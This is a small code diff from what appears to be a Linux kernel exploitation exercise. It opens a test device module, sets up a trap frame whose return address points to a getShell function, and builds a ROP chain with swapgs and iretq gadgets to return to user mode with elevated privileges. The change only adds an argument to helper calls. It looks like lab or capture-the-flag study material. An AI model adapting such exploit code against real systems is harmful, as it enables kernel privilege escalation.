@@ -17,11 +17,11 @@ int main(){
     int fd;
     long long rop[20] = { 0, };
 
-    fd = openModule("/dev/test");
-    prepTF64();
+    fd = openModule("/dev/test", 1);
+    prepTF64(1);
 
     tf.user_rip = getShell;
-    long long *gadget = ROPretUser64(tf, swapgs, iretq);
+    long long *gadget = ROPretUser64(tf, swapgs, iretq, 1);
 
     rop[0] = 0x4141414141414141;
     rop[1] = 0x4141414141414141;
